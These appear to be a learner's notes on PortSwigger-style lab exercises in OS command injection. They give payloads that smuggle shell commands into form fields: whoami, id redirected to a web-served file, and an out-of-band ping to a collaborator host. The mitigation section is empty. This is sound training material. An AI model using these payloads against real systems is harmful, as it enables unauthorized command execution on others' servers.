# OS Command Injection

## LAB 01: ****OS command injection, simple case****

![Untitled](OS%20Command%20Injection%20b1fdd04535d348acb618924d1af42914/Untitled.png)

```bash
productId=2;whoami&storeId=1
```

## LAB 02: ****Blind OS command injection with output redirection****

![Untitled](OS%20Command%20Injection%20b1fdd04535d348acb618924d1af42914/Untitled%201.png)

Difference output send back to the user when modifying the email param…

![Untitled](OS%20Command%20Injection%20b1fdd04535d348acb618924d1af42914/Untitled%202.png)

```bash
mail@gmail.com||id>/var/www/images/test.txt||
```

## LAB 00:

### Overall

![Untitled](OS%20Command%20Injection%20b1fdd04535d348acb618924d1af42914/Untitled%203.png)

In this case, nothing is going to response to the user except the result line when successful submit the form.

So, we need to test each field to find the place where we can inject the code, but in this context, we must use OAST technique.

Refer to:

[OS Command Injection](https://cel1s0.gitbook.io/offsec-notes/portswigger-academy/server-side-topics/os-command-injection#lab-blind-os-command-injection-with-out-of-band-interaction)

### Step to reproduce

So based on the refer above, we 

```jsx
csrf=MXBtEhVEHSS4tjOfv8OG0UnvvoPFE82O&name=name&email=email=a;ping -c 10 [collabID].oastify.com;&subject=subject&message=message
```

Result in the connection in collaborator 

![Untitled](OS%20Command%20Injection%20b1fdd04535d348acb618924d1af42914/Untitled%204.png)

### Mitigation

### Appendix